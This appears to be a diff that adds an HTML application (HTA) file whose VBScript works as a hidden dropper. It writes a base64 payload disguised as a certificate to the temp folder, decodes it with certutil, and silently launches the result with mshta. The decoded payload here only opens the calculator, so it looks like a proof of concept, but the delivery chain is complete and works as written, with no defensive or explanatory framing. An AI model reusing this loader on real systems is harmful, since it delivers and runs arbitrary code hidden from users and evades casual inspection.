@@ -1,0 +1,38 @@
+<html>
+<head>
+<hta:application id="htaTest"
+    applicationname="HTA"
+    border="thin"
+    borderstyle="normal"
+    caption="no"
+    showintaskbar="no"
+    windowstate="minimize">
+</hta:application>
+<script language="VBScript">
+    On Error Resume Next
+    Dim fso, shell, f, TempTxt, TempPath, base64
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+
+    TempTxt = shell.ExpandEnvironmentStrings("%TEMP%") & "\Temp.txt"
+    TempPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\Temp.hta"
+
+    base64 = "-----BEGIN CERTIFICATE-----" & vbCrLf & _
+             "PGh0bWw+PGhlYWQ+PGh0YTphcHBsaWNhdGlvbiB3aW5kb3dzdGF0ZT0iaGlkZSIgc2hvd2ludGFza2Jhcj0ibm8iIGNhcHRpb249Im5vIj48L2h0YTphcHBsaWNhdGlvbj48L2hlYWQ+PHNjcmlwdCBsYW5ndWFnZT0iVkJTY3JpcHQiPkNyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpLlJ1biAiY2FsYy5leGUiLCAwLCBGYWxzZTpzZWxmLmNsb3NlPC9zY3JpcHQ+PC9odG1sPg==" & vbCrLf & _
+             "-----END CERTIFICATE-----"
+
+    ' Write base64 payload
+    Set f = fso.CreateTextFile(TempTxt, True)
+    f.Write base64
+    f.Close
+
+    ' Decode using certutil
+    shell.Run "cmd /c certutil -decode """ & TempTxt & """ """ & TempPath & """", 0, True
+
+    ' Launch clean payload
+    shell.Run "mshta.exe """ & TempPath & """", 0, False
+</script>
+</head>
+<body></body>
+</html>
